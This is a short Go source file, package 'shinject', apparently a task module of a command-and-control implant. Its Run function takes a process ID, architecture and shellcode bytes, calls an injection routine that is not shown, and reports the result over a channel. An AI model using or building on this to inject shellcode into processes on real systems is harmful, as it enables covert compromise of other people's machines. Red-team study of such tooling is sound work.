package shinject

import (
	"encoding/json"
	"fmt"
	"log"

	"pkg/utils/structs"
)

type Injection interface {
	TargetPid() int
	Shellcode() []byte
	Success() bool
	SharedLib() string
}

type Arguments struct {
	PID                 int    `json:"pid"`
	Arch                string `json:"arch"`
	ShellcodeFile       string `json:"shellcode_file"`
	ShellcodeDataLength int    `json:"shellcode_len"`
	ShellcodeData       []byte
}

func Run(args *Arguments, tMsg *structs.ThreadMsg, threadChannel chan<- structs.ThreadMsg) {
	log.Println("Injection Arguments:")
	log.Println(json.MarshalIndent(*args, "", "    "))
	_, err := injectShellcode(uint32(args.PID), args.Arch, args.ShellcodeData)

	if err != nil {
		log.Println("Failed to inject shellcode:", err.Error())
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- *tMsg
		return
	}
    tMsg.Completed = true
	tMsg.TaskResult = []byte(fmt.Sprintf("Successfully injected into target process with id: %d", args.PID))
	threadChannel <- *tMsg
}
